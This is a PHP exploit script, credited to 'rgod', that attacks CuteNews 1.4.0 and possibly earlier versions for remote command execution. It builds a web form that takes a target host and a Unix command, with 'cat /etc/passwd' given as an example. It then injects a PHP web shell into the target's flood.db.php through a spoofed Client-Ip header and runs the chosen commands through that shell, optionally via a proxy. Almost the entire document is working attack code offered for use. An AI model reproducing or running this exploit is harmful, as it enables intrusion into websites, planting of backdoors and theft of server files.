<?php
#   cutenxpl.php                                                               #
#                                                                              #
#          CuteNews 1.4.0(possibly prior versions) remote code execution       #
#                              by rgod                                         #
#                  site: http://rgod.altervista.org                            #
#                                                                              #
#  usage: launch form Apache, fill in requested fields, then go!               #
#                                                                              #
#  make these changes in php.ini if you have troubles                          #
#  with this script:                                                           #
#  allow_call_time_pass_reference = on                                         #
#  register_globals = on                                                       #
#                                                                              #
#  Sun Tzu: "In the  practical art of war, the  best thing of all  is to  take #
#  the enemy's  country whole and  intact;  to  shatter and destroy it is  not #
#  so good. So, too, it is better to recapture an army entire than to  destroy #
#  it, to capture a regiment, a detachment or a company entire than to destroy #
#  them."                                                                      #

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 2);
ob_implicit_flush (1);

echo'<head><title>CuteNews <= 1.4.0  remote  commands  execution </title>  <meta
http-equiv="Content-Type"  content="text/html; charset=iso-8859-1"> <style type=
"text/css"> <!-- body,td,th {color:  #00FF00;} body {background-color: #000000;}
.Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif; font-size: 10px; }
.Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight:  bold;
font-style: italic; } --> </style></head> <body> <p class="Stile6"> CuteNews  <=
1 . 4 . 0  (possibly prior versions) remote commands execution</p><p class="Stil
e6">a script by rgod at <a href="http://rgod.altervista.org"    target="_blank">
http://rgod.altervista.org</a></p><table width="84%"><tr><td width="43%"> <form
name="form1" method="post"   action="'.$SERVER[PHP_SELF].'?path=value&host=
value&port=value&command=value&proxy=value&main=value">   <p>       <input type=
"text" name="host"><span class="Stile5">hostname (ex: www.sitename.com)  </span>
</p><p><input type="text" name="path"><span class="Stile5">  path (ex: /cute/ or
just /) </span></p><p><input type="text" name="main"><span class="Stile5"> main
page where article are listed, ex: in default installation "example2.php"</span>
</p><p><input type="text"name="port"><span class="Stile5"> specify a port  other
than 80 ( default value ) </span> </p>  <p>  <input  type="text" name="command">
<span  class="Stile5"> a Unix command , example: ls -la  to list directories, ca
t /etc/passwd to show passwd file </span></p><p><input type="text" name="proxy">
<span class="Stile5">  send exploit through an HTTP  proxy (ip:port) </span></p>
<p>   <input   type="submit" name="Submit"  value="go!"> </p></form> </td> </tr>
</table></body></html>';

function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '<table border="0"><tr>';
while ($ii <= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo "<td>&nbsp;&nbsp;</td>";
             for ($li=0; $li<=15; $li++)
                      { echo "<td>".$headeri[$li+$ki]."</td>";
			    }
            $ki=$ki+16;
            echo "</tr><tr>";
            }
if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
{echo "<td>".$datai."</td> ";}
$ii++;
$ji++;
}
for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo "<td>&nbsp&nbsp</td>";
                       }

for ($li=$ci*16; $li<=strlen($headeri); $li++)
                      { echo "<td>".$headeri[$li]."</td>";
			    }
echo "</tr></table>";
}

$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacket($packet)
{
global $proxy, $host, $port, $html;
if ($proxy=='')
           {$ock=fsockopen(gethostbyname($host),$port);}
             else
           {
	    if (!eregi($proxy_regex,$proxy))
	    {echo htmlentities($proxy).' -> not a valid proxy...';
	     die;
	    }
	   $parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
	    $ock=fsockopen($parts[0],$parts[1]);
	    if (!$ock) { echo 'No response from proxy...';
			die;
		       }
	   }
fputs($ock,$packet);
if ($proxy=='')
  {

    $html='';
    while (!feof($ock))
      {
        $html.=fgets($ock);
      }
  }
else
  {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
    {
      $html.=fread($ock,1);
    }
  }
fclose($ock);
echo nl2br(htmlentities($html));
}

if (($path<>'') and ($host<>'') and ($command<>'') and ($main<>''))
{
  if ($port=='') {$port=80;}

#STEP 1 -> Retrieve an article id
if ($proxy=='')
{$packet="GET ".$path.$main." HTTP/1.0 \r\n";}
else
{$packet="GET ".$host.$path.$main." HTTP/1.0 \r\n";}
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Accept-Encoding: text/plain\r\n";
$packet.="Host: ".$host."\r\n\r\n";
$packet.="Connection: Close\r\n\r\n";
show($packet); //show the packet for debugging purposes 
sendpacket($packet);
$temp=explode("id=",$html);
$temp2=explode("&amp;",$temp[1]);
$articleid=$temp2[0];
echo '<br><br>Article ID -> '.htmlentities($articleid).'<br><br>';

#STEP 2 -> Inject a shell in flood.db.php

$shell='<?php error_reporting(0); system($HTTP_GET_VARS[cmd]); ?>'; //customize it for your own pleasure...
$title=':)'; //comment title
$comment='Very glad to read such a good article! You should win Pulitzer prize!'; //customize here
$data="name=".urlencode($title)."&comments=".urlencode($comment)."&submit=Add+My+Comment&subaction=addcomment&ucat=1&show=";

if ($proxy=='')
{$packet="POST ".$path.$main."?subaction=showcomments&id=".urlencode($articleid)."&archive=&start_from=&ucat=1& HTTP/1.1\r\n";}
else
{$packet="POST http://".$host.$path.$main."?subaction=showcomments&id=".urlencode($articleid)."&archive=&start_from=&ucat=1& HTTP/1.1\r\n";}

$packet.="User-Agent: msnbot/1.0 (+http://search.msn.com/msnbot.htm)\r\n";
$packet.="Client-Ip: ".$shell."\r\n"; //spoof HTTP_CLIENT_IP var...
$packet.="Host: ".$host."r\n";
$packet.="Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\n";
$packet.="Accept-Language: it,en;q=0.9\r\n";
$packet.="Accept-Charset: windows-1252, utf-8, utf-16, iso-8859-1;q=0.6, *;q=0.1\r\n";
$packet.="Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\r\n";
$packet.="Referer: http://".$host.$path."example2.php?subaction=showcomments&id=".urlencode($articleid)."&archive=&start_from=&ucat=1&\r\n";
$packet.="Connection: Keep-Alive, TE\r\n";
$packet.="TE: deflate, gzip, chunked, identity, trailers\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n\r\n";
$packet.=$data;
show($packet); // debugging...
sendpacket($packet);

# STEP 3 -> Launch commands
echo '<br> If CuteNews is unpatched and vulnerable, now you will see '.htmlentities($command).' output...<br>';
if ($proxy=='')
{$packet="GET ".$path."data/flood.db.php?cmd=".urlencode($command)." HTTP/1.0 \r\n";}
else
{$packet="GET ".$host.$path."data/flood.db.php?cmd=".urlencode($command)." HTTP/1.0 \r\n";}
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Accept-Encoding: text/plain\r\n";
$packet.="Host: ".$host."\r\n\r\n";
$packet.="Connection: Close\r\n\r\n";
show($packet); //debugging...
sendpacket($packet);
}
else
{echo 'fill in all requested fields...';}
?>
